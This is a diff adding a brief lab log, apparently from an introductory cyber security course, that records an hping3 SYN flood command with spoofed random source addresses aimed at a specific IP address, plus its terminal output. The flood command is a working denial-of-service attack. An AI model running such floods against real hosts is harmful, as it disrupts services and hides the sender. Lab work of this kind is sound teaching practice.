@@ -1,0 +1,9 @@
+command We have used - sudo hping3 -S -p 80 -c 1000 --rand-source -s 3000-4000 --flood 137.184.173.203
+
+root@comp3134-winter-2025-intro-to-cyber-security:~# sudo hping3 -S -p 80 -c 1000 --rand-source -s 3000-4000 137.184.173.203
+using eth0, addr: 159.89.125.95, MTU: 1500
+HPING 137.184.173.203 (eth0 137.184.173.203): S set, 40 headers + 0 data bytes
+^C
+--- 137.184.173.203 hping statistic ---
+1000 packets transmitted, 0 packets received, 100% packet loss
+root@comp3134-winter-2025-intro-to-cyber-security:~# 
